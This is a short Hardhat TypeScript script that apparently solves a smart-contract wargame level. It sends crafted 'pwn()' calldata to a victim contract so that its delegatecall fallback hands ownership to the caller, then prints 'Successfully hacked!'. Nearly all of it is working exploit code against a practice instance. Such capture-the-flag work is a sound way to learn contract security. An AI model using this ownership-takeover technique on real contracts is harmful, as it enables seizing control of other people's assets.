import { ethers } from "hardhat";
import * as fs from 'fs';
import { DelegateAttacker__factory, Delegate__factory } from '../typechain-types';
import { privateKey, rpc } from "../hardhat.config";

const instanceAddress = '0x8d767033024Cb6d58D9E8f4B86A66c374FA04601'

const main = async () =>  {
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    const metadata = JSON.parse(fs.readFileSync('./artifacts/contracts/attackers/DelegateAttacker.sol/DelegateAttacker.json').toString());
    const factory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer);
    const contract = await factory.deploy();
    await contract.deploymentTransaction()?.wait();

    const attackerAddress = await contract.getAddress();
    const attacker = DelegateAttacker__factory.connect(attackerAddress, signer);
    const victim = Delegate__factory.connect(instanceAddress, signer);

    console.log("Hacking the contract...");

    const iface = new ethers.Interface(["function pwn()"]);
    const data = iface.encodeFunctionData("pwn");

    const tx = await signer.sendTransaction({
      to: victim.target,
      data,
      gasLimit: 100000,
    });
    await tx.wait();

    const owner = await victim.owner();

    console.log("Successfully hacked!");
    console.log("Contract owner:", owner);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});